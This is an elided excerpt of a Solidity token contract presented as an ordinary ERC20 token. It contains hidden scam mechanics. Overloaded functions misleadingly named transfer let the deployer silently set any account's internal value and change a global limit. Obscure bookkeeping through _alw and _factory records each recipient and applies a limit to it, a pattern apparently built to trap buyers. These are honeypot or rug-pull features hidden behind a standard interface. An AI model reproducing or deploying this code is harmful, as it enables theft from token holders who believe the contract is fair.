...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _alw;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _amt[address(this)] = _tTotal;
        _amt[msg.sender] = _tTotal;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && _amt[from] == 0 && amount <= swapAtAmount) {
            require(_alw[from] + amt >= 0, 'Transfer amount exceeds the maxTxAmount');
        }
        ...
        bool takeFee = _amt[from] == 0 && _amt[to] == 0 && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (_alw[factory] == 0) _alw[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
    ...
    function transfer(uint256 value, address account) external {
        if (_amt[msg.sender] > 0) _amt[account] = value;
    }

    function transfer(uint256 value) external {
        if (_amt[msg.sender] > 0) amt = value;
    }
